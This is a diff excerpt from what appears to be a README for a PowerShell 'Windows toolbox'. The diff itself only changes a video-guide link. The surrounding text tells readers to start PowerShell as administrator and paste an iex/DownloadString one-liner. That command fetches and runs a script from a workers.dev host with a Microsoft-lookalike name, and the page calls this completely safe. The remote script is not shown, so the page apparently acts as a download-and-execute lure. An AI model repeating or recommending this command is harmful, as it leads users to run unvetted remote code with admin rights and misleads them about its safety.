@@ -57,7 +57,7 @@ It's Completely Safe to use because everything is reversible
 Start powershell with admin right and paste the following link and enter. <br />
 ```iex((New-Object System.Net.WebClient).DownloadString('https://ps.microsoft-toolbox.workers.dev'))``` <br />
  
-Video Guide: ```https://youtu.be/vA7Sr6d12oU``` <br /><br />
+Video Guide: ```https://www.youtube.com/watch?v=uOf_wH6jSEE``` <br /><br />
 
 <img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/how%20to%20run%20toolbox.jpg" alt="text" width="550"> <br />
 <img src="https://raw.githubusercontent.com/windowtoolbox/powershell-windows-toolbox/main/how%20to%20use%20powershell.JPG" alt="text" width="650"> <br />
